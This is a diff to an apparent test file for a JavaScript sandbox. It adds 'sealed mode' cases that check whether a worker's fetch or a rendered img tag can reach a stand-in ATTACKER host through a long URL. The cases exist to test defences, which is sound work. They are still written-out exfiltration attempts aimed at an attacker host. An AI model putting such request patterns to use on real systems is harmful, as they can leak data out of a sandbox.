@@ -42,7 +42,9 @@ const CASES = [
     { name: 'cooperative mode, a fetch of a long data: URL', mode: 'cooperative' as const, prefix: 'data', run: `fetch('data:text/plain,' + 'a'.repeat(${LONG})).catch(() => {}); console.log('sent')` },
     { name: 'cooperative mode, an image from a blob: URL whose path is long', mode: 'cooperative' as const, prefix: 'blob', run: `const i = new Image(); i.src = URL.createObjectURL(new Blob(['x'])) + '#' + 'a'.repeat(${LONG}); console.log('sent')` },
     { name: 'strict mode, the worker\'s fetch of a long https URL', mode: 'strict' as const, prefix: `${ATTACKER}/long-`, run: `fetch('${ATTACKER}/long-' + 'a'.repeat(${LONG})).catch(() => {}); console.log('sent')` },
+    { name: 'sealed mode, the worker\'s fetch of a long https URL', mode: 'sealed' as const, prefix: `${ATTACKER}/long-`, run: `fetch('${ATTACKER}/long-' + 'a'.repeat(${LONG})).catch(() => {}); console.log('sent')` },
     { name: 'strict mode, the view\'s image of a long https URL', mode: 'strict' as const, prefix: `${ATTACKER}/long-`, run: `sandboxView.render('<img src="${ATTACKER}/long-' + 'a'.repeat(${LONG}) + '">'); console.log('sent')` },
+    { name: 'sealed mode, the view\'s image of a long https URL', mode: 'sealed' as const, prefix: `${ATTACKER}/long-`, run: `sandboxView.render('<img src="${ATTACKER}/long-' + 'a'.repeat(${LONG}) + '">'); console.log('sent')` },
 ];
 
 for (const { name, mode, prefix, run } of CASES) {
